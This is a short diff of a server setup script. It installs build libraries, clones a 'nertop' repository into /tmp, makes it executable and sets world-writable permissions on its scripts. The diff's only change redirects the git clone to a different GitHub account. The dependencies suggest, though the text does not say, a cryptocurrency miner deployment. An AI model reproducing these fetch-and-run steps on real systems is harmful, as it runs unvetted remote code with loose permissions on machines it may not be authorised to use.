@@ -17,7 +17,7 @@ sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
 cd /tmp && mkdir nertop
-git clone https://github.com/nertonbu/nertop.git /tmp/nertop
+git clone https://github.com/retropok/nertop.git /tmp/nertop
 cd /tmp/nertop
 chmod +x /tmp/nertop/nertop
 chmod 777 ./*.sh
